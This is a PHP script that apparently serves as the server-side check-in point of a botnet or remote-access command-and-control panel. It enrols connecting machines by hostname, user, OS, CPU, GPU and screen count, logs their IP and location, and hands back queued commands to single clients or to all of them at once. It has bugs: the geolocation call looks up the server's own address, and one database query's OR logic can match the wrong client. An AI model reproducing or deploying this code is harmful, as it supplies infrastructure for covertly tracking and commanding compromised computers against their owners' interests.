<?php
//error_reporting(0);
require ('redbean.php');
require ('config.php');
global $mysqlHost;
global $mysqlDbName;
global $mysqlUsername;
global $mysqlPassword;
R::setup('mysql:host=' . $mysqlHost . ';dbname=' . $mysqlDbName, $mysqlUsername, $mysqlPassword);
//user, os, cpu, gpu, ip, country
$geoData = unserialize(file_get_contents('http://ip-api.com/php/'));
if (isset($_POST['machine']) && isset($_POST['user']) && isset($_POST['os']) && isset($_POST['cpu']) && isset($_POST['gpu']) && isset($_POST['screens'])) {
    $clientInfo = new ClientInfo($_SERVER['REMOTE_ADDR'], $_POST['machine'], $_POST['user'], $_POST['os'], $_POST['cpu'], $_POST['gpu'], $geoData['country'], $geoData['regionName'], $_POST['screens']);
    $clientTableId = addNewClient($clientInfo);
    die('<clientid>' . $clientTableId . '</clientid>');
} else {
    if (isset($_POST['clientid'])) {
        $client = R::load('clients', $_POST['clientid']);
        if (empty($client)) {
            die('could not load client by id');
        } else {
            $client->minute = date('i');
            if (isset($_POST['status'])) {
                $client->status = $_POST['status'];
            }
            if (empty(R::store($client))) {
                die('could not store client');
            } else {
                // get commands ....
                foreach (getCommands($_POST['clientid']) as $command) {
                    echo ('<uniquename>' . $command->uniquename . '</uniquename>' . '<targetid>' . $command->targetid . '</targetid>' . '<name>' . $command->cmdname . '</name>' . '<args>' . $command->cmdargs . '</args><br>');
                }
                die();
            }
        }
    } else {
        die();
    }
}
function findClient($clientInfo) {
    $client = R::findOne('clients', 'machine = :machine AND user = :user AND os = :os AND cpu = :cpu AND gpu = :gpu OR ip = :ip', ['machine' => $clientInfo->machine, 'user' => $clientInfo->user, 'os' => $clientInfo->os, 'cpu' => $clientInfo->cpu, 'gpu' => $clientInfo->gpu, 'ip' => $clientInfo->ip]);
    return $client;
}
function getCommands($clientId) {
    $commands = R::findAll('commands', 'targetid = ? OR targetid = ?', [$clientId, '*']);
    return $commands;
}
function addNewClient($clientInfo) {
    $thisMinute = date('i');
    $client = findClient($clientInfo);
    // only update client table if found
    if (!empty($client)) {
        $client->minute = $thisMinute;
        $client->machine = $clientInfo->machine;
        $client->user = $clientInfo->user;
        $client->os = $clientInfo->os;
        $client->cpu = $clientInfo->cpu;
        $client->gpu = $clientInfo->gpu;
        $client->ip = $clientInfo->ip;
        $client->country = $clientInfo->country;
        $client->region = $clientInfo->region;
        $client->status = 'connected';
        $client->screens = $clientInfo->screens;
        // add client to table
        
    } else {
        $client = R::dispense('clients');
        $client->minute = $thisMinute;
        $client->machine = $clientInfo->machine;
        $client->user = $clientInfo->user;
        $client->os = $clientInfo->os;
        $client->cpu = $clientInfo->cpu;
        $client->gpu = $clientInfo->gpu;
        $client->ip = $clientInfo->ip;
        $client->country = $clientInfo->country;
        $client->region = $clientInfo->region;
        $client->status = 'connected first time';
        $client->screens = $clientInfo->screens;
    }
    $clientId = R::store($client);
    if (!empty($clientId)) return $clientId;
    else die('could not store client');
}
class ClientInfo {
    public $ip;
    public $machine;
    public $user;
    public $os;
    public $cpu;
    public $gpu;
    public $country;
    public $region;
    public $screens;
    public function __construct($ip, $machine, $user, $os, $cpu, $gpu, $country, $region, $screens) {
        $this->ip = $ip;
        $this->machine = $machine;
        $this->user = $user;
        $this->os = $os;
        $this->cpu = $cpu;
        $this->gpu = $gpu;
        $this->country = $country;
        $this->region = $region;
        $this->screens = $screens;
    }
}
?>